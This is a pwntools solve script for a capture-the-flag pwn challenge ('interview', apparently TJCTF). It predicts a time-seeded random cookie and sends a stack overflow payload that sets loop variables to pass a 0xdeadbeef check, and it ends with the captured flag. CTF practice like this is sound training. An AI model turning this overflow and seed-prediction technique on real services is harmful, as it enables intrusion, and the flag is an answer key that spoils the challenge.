#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from time import time
import subprocess

context.terminal = ['gnome-terminal', '-e']
exe = context.binary = ELF('interview')

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x0
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

seed = int(time())
log.info("Seed: " + str(seed))

process = subprocess.Popen(['./rand', str(seed)], stdout=subprocess.PIPE)
stdout = process.stdout

nums = []
for i in range(10):
    nums.append(stdout.readline().strip())
log.info("Cookie: " + ' '.join(nums))

cookie = ''.join([p32(int(x)) for x in nums])

"""
stack layout
  int v1[10]; // [esp+8h] [ebp-A0h]
  char s; // [esp+30h] [ebp-78h]
  int v3[10]; // [esp+70h] [ebp-38h]
  int j; // [esp+98h] [ebp-10h]
  int i; // [esp+9Ch] [ebp-Ch]

before this condition ( a1 - i + j == 0xdeadbeef )
j = 10
i = controlled
a1 = 0
"""
# name + predicted cookie + j + i

payload = "A" * 64 + cookie + p32(0x0) + p32(0x2152411b)
log.info('Payload: ' + payload)

io.sendlineafter("What is your name?\n", payload)
log.success(io.recv())
io.interactive()

# tjctf{3l_p5y_k0n6r00_0ur_n3w357_l4b_m3mb3r!}
